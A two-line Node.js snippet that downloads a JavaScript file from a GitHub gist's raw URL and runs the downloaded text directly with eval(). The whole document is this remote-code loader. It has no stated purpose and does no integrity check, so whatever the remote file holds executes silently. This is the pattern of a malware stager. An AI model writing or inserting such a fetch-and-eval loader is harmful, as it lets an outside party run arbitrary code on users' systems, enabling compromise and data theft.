const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/784c1ceca6daecb5fca9ca0bc54ac9a3a2c31f5d/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
